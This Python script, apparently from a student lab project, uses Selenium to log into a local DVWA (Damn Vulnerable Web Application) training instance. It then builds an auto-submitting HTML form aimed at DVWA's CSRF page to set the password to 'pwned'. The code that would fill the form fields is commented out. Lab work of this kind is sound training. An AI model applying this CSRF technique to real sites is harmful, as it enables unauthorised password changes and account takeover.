# -*- coding: utf-8 -*-
"""
Created on Sat Dec 31 10:54:57 2022

@author: Callum Manning

Strath Uni - 201720173


"""
from UserSetUp import *
from ExtModulesSetUp import *
from StatementGen import *
from passCracker import *
from BrowserSetUp import *
from Pcap_Capture import *
from NameGenerator import *
from KaliSetUp import *

from selenium import webdriver
import os


driver = openBrowser()
#Pull up DVWA login Page
driver.get(LOGIN)

#Login to DVWA
loginDVWA(driver)


driver.implicitly_wait(12)
driver.set_page_load_timeout(10)

def _post_selenium(url: str, data: dict):
    input_template = '{k} <input type="text" name="{k}" id="{k}" value="{v}"><BR>\n'
    inputs = ""
    # if data:
    #     for k, v in data.items():
    #         inputs += input_template.format(k=k, v=v)
    html = f'<html><body>\n<form action="{url}" method="post" id="formid">\n{inputs}<input type="submit" id="inputbox">\n</form></body></html>'
    html_file = os.path.join(os.getcwd(), 'temp.html')
    with open(html_file, "w") as text_file:
        text_file.write(html)

    driver.get(f"file://{html_file}")
    driver.implicitly_wait(12)
    driver.find_element(By.ID,'inputbox').click()

_post_selenium("http://127.0.0.1:8080/dvwa/vulnerabilities/csrf/", {"password_new": "pwned", "password_conf":"pwned","Change":"Change"})

#driver.close()